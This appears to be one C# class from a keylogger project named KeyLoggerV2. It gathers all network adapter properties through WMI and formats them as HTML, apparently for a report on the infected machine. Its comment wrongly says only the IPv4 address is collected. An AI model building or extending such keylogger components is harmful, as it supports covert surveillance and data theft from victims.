using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoggerV2
{
    class NetworkInfo
    {
        private static TextBox txtBody = new TextBox();

        //Getting the network information from the ManagementClass. Only supplies the ipv4 address. 
        public string GetNtInformation()
        {
            try
            {
                ManagementClass mc = new ManagementClass("Win32_NetworkAdapter");

                foreach (ManagementObject mngObj in mc.GetInstances())
                {
                    foreach (PropertyData pd in mngObj.Properties)
                    {
                        if (pd.Value != null)
                        {
                            txtBody.Text += "<br>" + pd.Name + ":" + pd.Value + "<br>";
                        }
                    }
                }
                return txtBody.Text;
            }
            catch
            {
                return "Not available";
            }
        }
    }
}
